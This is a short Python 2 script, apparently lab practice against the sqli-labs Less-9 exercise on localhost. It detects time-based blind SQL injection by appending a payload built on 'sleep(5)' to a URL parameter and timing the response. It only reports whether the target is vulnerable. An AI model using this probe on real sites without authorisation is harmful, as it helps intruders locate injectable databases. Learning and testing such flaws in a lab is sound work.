#!usr/bin/env python
#!-*- coding:utf-8 -*-
__Author__ = 'moxiaoxi'
__Filename__ = 'Timeblind.py'

import urllib2
import urllib
import sys
import time

headers = {
       'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
       'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
       'Accept-Encoding': 'none',
       'Accept-Language': 'en-US,en;q=0.8',
       'Connection': 'keep-alive',  
}

target='http://localhost:8888/sqli-labs/less-9/index.php?id=1'
test  = '\'+and+sleep(5)+%23'
database = ''

def TestInjection():
    '测试是否存在Time injection'
    try:
        #记录开始请求的时间
        start_time = time.time()
        #发送正常HTTP请求，测试正常响应时间
        req1 = urllib2.Request(target,None,headers)
        result1 = urllib2.urlopen(req1)
        print 'Request:',req1._Request__original
        end_time_1 = time.time()
        #测试攻击payload，测试payload响应时间
        req2 = urllib2.Request(target+test,None,headers)
        print 'Request:',req2._Request__original
        result2 = urllib2.urlopen(req2)
        end_time_2 = time.time()
        #计算时间差
        delta1 =  end_time_1 - start_time
        delta2 = end_time_2 - end_time_1
        print 'delta1: %s ,delta2: %s '%(str(delta1),str(delta2))
        if (delta2 - delta1) > 4 :
            print "%s is vulnerable !" %target
            return True
        else:
            print "%s is not vulnerable !"% target
            return False
    except Exception,e:
        print 'Something error!'
        print e



if __name__=='__main__':
    TestInjection()